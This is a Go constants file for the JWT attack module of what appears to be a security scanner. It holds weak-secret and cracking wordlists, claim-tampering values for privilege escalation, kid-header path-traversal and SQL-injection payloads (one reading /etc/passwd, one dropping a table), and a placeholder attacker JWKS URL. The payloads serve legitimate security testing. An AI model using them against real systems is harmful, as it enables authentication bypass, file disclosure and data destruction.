package mutate

// JWT mutator tuning constants. Centralized so calibration is a one-file
// diff. Mirrors detect/tuning.go's role but stays in the mutate package
// because detect cannot be imported here (would form a cycle).

// WeakHMACSecrets is the list of secrets jwt-resign-weak-key tries.
// Deliberately short and conventional — long lists belong in a v1.1
// dedicated cracker; this list catches "we forgot to change the
// default" and "the secret is the product name". Order is deterministic
// (declaration order) per D11.
var WeakHMACSecrets = []string{
	"secret",
	"password",
	"changeme",
	"key",
	"jwt",
	"admin",
	"",
	"possession",
}

// JWTClaimClassByName maps a high-value JWT claim name to the finding
// class jwt-claim-tamper emits when the variant flips that claim:
// privesc when the claim affects role/scope/permission, authn-bypass
// when it affects identity, idor for tenant boundaries (dormant, D31).
var JWTClaimClassByName = map[string]string{
	"role":   "privesc",
	"admin":  "privesc",
	"scope":  "privesc",
	"groups": "privesc",
	"sub":    "authn-bypass",
	"uid":    "authn-bypass",
	"user":   "authn-bypass",
	"email":  "authn-bypass",
	"tenant": "idor",
}

// JWTEscalatedValues is the value jwt-claim-tamper substitutes when
// escalating a privilege claim. Identity-spoofing claims are not in
// this map — they get values from other matrix identities' Markers
// at generation time.
var JWTEscalatedValues = map[string]any{
	"role":   "admin",
	"admin":  true,
	"scope":  "admin",
	"groups": "admin",
}

// ─── P5 additions ─────────────────────────────────────────────────────

// KidInjectionPayload describes one kid manipulation variant.
type KidInjectionPayload struct {
	Class string // "path-traversal" | "sqli"
	Value string
}

// KidInjectionPayloads is the set of kid header values jwt-kid-injection
// injects. One variant per entry. Order is deterministic (declaration order).
var KidInjectionPayloads = []KidInjectionPayload{
	{Class: "path-traversal", Value: "../../../dev/null"},
	{Class: "path-traversal", Value: "../../../../etc/passwd"},
	{Class: "path-traversal", Value: "/dev/null"},
	{Class: "sqli", Value: "' OR '1'='1"},
	{Class: "sqli", Value: "1; DROP TABLE keys--"},
	{Class: "sqli", Value: "\" OR 1=1--"},
}

// JWKSAttackerURL is the placeholder attacker JWKS endpoint URL used in
// jwt-jwks-spoof's jku variant. In a live pentest the user would point
// this at their own server; for corpus testing the vulnapp trusts any URL.
const JWKSAttackerURL = "https://attacker.example.com/.well-known/jwks.json"

// HmacCrackWordlist is the extended wordlist for jwt-hmac-crack. Superset
// of WeakHMACSecrets to also cover common app-specific defaults.
var HmacCrackWordlist = []string{
	"secret",
	"password",
	"changeme",
	"key",
	"jwt",
	"admin",
	"",
	"possession",
	"1234567890",
	"test",
	"abc123",
	"qwerty",
	"letmein",
	"welcome",
	"your-256-bit-secret",
	"super-secret-key",
}

// HmacCrackMaxAttempts caps the number of wordlist entries tried per
// token location to keep scan runtime bounded.
const HmacCrackMaxAttempts = 500
